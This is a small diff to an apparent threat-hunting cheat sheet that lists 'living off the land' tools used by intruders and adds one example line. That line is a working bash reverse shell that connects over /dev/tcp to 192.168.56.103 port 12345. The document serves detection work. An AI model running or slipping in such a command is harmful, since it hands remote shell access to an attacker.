@@ -358,6 +358,7 @@ Below is the expected look of a healthy Windows system
   * mactime –b filedump.txt > filedump_mac.txt
 * Look for signs of an adversary "Living off the land"
   * arp nmap ping who whoami traceroute nslookup dig telnet netstat lsof host ss route macchange ip tcpkill id getent wget curl shred touch openssl chattr gcc history iptables xwd
+  * L.O.L. exampe: /bin/bash -c '/bin/sh 0</dev/tcp/192.168.56.103/12345 1>&0 2>&0' 2>&1
   
 Sources:  
 * Sqrrl Huntpedia PDF  
